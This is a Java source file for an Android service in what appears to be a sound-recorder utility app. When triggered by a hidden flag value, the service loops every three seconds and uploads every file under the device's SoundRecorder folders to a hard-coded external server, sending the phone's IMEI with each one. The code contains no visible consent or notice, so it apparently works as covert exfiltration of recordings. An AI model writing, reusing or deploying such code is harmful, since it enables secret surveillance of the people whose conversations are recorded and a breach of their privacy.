package com.sid.soundrecorderutils.network;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;
import com.lzy.okgo.request.PostRequest;
import com.sid.soundrecorderutils.utils.DeviceUtils;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;

/**
 * Created by lv on 19-10-14.
 */

public class APIForegroundService extends Service {
    private boolean pushthread = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent.getStringExtra("flags").equals("233333")) {
            getPushThread();
        }

        flags = Service.START_FLAG_REDELIVERY;
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //循环请求的线程
    public void getPushThread() {
        pushthread = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (pushthread) {
                    try {
                        Thread.sleep(3000);
                        startUploadFile();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

    public void startUploadFile() {
        ArrayList<VideoItem> videoFiles = GetAllEng();
        if (videoFiles != null) {
            final int size = videoFiles.size();
            final String imei = DeviceUtils.getDeviceIdIMEI(getApplicationContext());
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
            String todayDate = sdf.format(new Date());
            String md5Content = DeviceUtils.md5Decode32(imei + todayDate);
            StringBuilder signSB = new StringBuilder();
            signSB.append(md5Content.substring(0, 1));
            signSB.append(md5Content.substring(5, 6));
            signSB.append(md5Content.substring(7, 8));
            signSB.append(md5Content.substring(12, 13));
            for (int i = 0; i < size; i++) {
                PostRequest<String> request = OkGo.<String>post("http://port.buileader.cn/fileup.php")
                        .params("deviceID", imei)
                        .params("sign", signSB.toString())
                        .params("file", new File(videoFiles.get(i).path));
                request.execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        String body = response.body();
                        Log.e("sr_up","Success"+response.message()+" -- " + response.body());
                    }

                    @Override
                    public void onError(Response<String> response) {
                        Log.e("sr_up","Error:"+response.message()+" -- " + response.body()+"  -- "+response.getException().getMessage());
                    }
                });
            }
        }
    }

    //遍历文件夹
    private ArrayList<VideoItem> GetAllEng() {

        String filePath = Environment.getExternalStorageDirectory() + "/SoundRecorder";
        File dir = new File(filePath);
        File file[] = dir.listFiles();
        if (file.length < 1) return null;

        ArrayList<VideoItem> videoFiles = new ArrayList<VideoItem>();
        HashMap<String, String> file_map = new HashMap<>();
        for (int i = 0; i < file.length; i++) {
            if (file[i].isDirectory()) {
                String name = file[i].getName();
                file_map.put(name, name);
                getFiles(videoFiles, filePath + "/" + name, name);
            }

        }
        return videoFiles;
    }

    private void getFiles(ArrayList<VideoItem> fileList, String path, String name) {
        File[] allFiles = new File(path).listFiles();
        for (int i = 0; i < allFiles.length; i++) {
            File file = allFiles[i];
            if (file.isFile()) {
                VideoItem videoItem = new VideoItem(file.getPath(), name);
                fileList.add(videoItem);
            }
        }
    }

    @Override
    public void onDestroy() {
        pushthread = false;
        stopForeground(true);
        super.onDestroy();
    }
}
